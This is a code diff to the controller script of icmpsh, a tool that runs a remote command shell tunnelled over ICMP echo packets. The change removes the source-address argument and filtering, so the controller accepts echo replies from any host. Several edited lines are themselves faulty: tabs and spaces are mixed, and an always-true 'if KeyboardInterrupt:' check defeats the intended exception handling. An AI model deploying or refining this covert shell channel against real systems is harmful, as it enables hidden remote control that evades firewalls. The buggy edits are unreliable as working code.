@@ -37,7 +37,7 @@ def setNonBlocking(fd):
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
 
-def main(src, dst):
+def main(dst):
  while True:
     if subprocess.mswindows:
         sys.stderr.write('icmpsh master can only run on Posix systems\n')
@@ -68,7 +68,7 @@ def main(src, dst):
 
     # Create a new IP packet and set its source and destination addresses
     ip = ImpactPacket.IP()
-    ip.set_ip_src(src)
+    #ip.set_ip_src(src)
     ip.set_ip_dst(dst)
 
     # Create a new ICMP packet of type ECHO 
@@ -114,10 +114,15 @@ def main(src, dst):
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and  0 == icmppacket.get_icmp_type() :
+            if 0 == icmppacket.get_icmp_type() :
               try:
                 # Get identifier and sequence number
-                ident = icmppacket.get_icmp_id()
+                #dst =  ippacket.get_ip_src()
+                #src =  ippacket.get_ip_dst()
+                #ip.set_ip_src(src)
+                #ip.set_ip_dst(dst)
+
+		ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
                 seq_id += 1
 		data = icmppacket.get_data_as_string()
@@ -144,14 +149,17 @@ def main(src, dst):
 		ip.contains(icmp)
   		sock.sendto(ip.get_packet(), (dst, 0))
               except:
-                break
+	        if KeyboardInterrupt:  
+		 return
+                else:
+                 break
 	#time.sleep(5)
 
 if __name__ == '__main__':
-    if len(sys.argv) < 3:
+    if len(sys.argv) < 2:
         msg = 'missing mandatory options. Execute as root:\n'
-        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
+        msg += './icmpsh-m.py <destination IP address>\n'
         sys.stderr.write(msg)
         sys.exit(1)
 
-    main(sys.argv[1], sys.argv[2])
+    main(sys.argv[1])
